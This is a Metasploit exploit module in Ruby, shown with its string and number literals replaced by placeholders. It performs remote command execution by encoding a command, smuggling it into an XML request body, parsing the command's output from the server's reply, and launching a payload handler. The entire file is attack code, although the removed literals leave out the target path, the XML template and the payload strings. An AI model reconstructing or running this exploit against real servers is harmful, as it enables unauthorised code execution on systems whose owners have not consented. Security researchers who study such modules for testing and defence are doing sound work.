require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = ExcellentRanking include Msf :: Exploit :: Remote :: HttpClient def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> , <str> ] , <str> = > MSF_LICENSE , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , ] , <str> = > false , <str> = > [ <str> ] , <str> = > ARCH_CMD , <str> = > { <str> = > <int> , <str> = > true , <str> = > [ <str> , <str> ] , } , <str> = > [ [ <str> , { } ] , ] , <str> = > <int> , <str> = > <str> ) ) register_options ( [ OptString . new ( <str> , [ true , <str> , <str> ] ) , ] , self . class ) deregister_options ( <str> , <str> ) end def go ( command ) encoded = command . unpack ( <str> ) . collect { | x | <str> x <str> } . join ( <str> ) wrapper = rand_text_alphanumeric ( rand ( <int> ) + <int> ) cmd = <str> wrapper <str> encoded <str> wrapper <str> xml = <str> + <str> + <str> + rand_text_alphanumeric ( rand ( <int> ) + <int> ) + <str> + <str> + <str> + rand_text_alphanumeric ( rand ( <int> ) + <int> ) + <str> cmd <str> + <str> + rand_text_alphanumeric ( rand ( <int> ) + <int> ) + <str> + <str> + <str> ; res = send_request_cgi ( { <str> = > normalize_uri ( datastore [ <str> ] ) , <str> = > <str> , <str> = > <str> , <str> = > xml , } , <int> ) if ( res and res . body ) b = <str> wrapper <str> wrapper <str> . match ( res . body ) if b return b . captures [ <int> ] elsif datastore [ <str> ] == true b = <str> . match ( res . body ) if b fail_with ( Failure :: BadConfig , <str> ) end end end return nil end def check response = go ( <str> ) if ( ! response . nil? and response =~ <str> ) return Exploit :: CheckCode :: Vulnerable end return Exploit :: CheckCode :: Safe end def exploit response = go ( payload . encoded ) if response == nil print_error ( <str> ) else if response . length == <int> print_status ( <str> ) else print_status ( <str> response <str> ) end handler end end end 
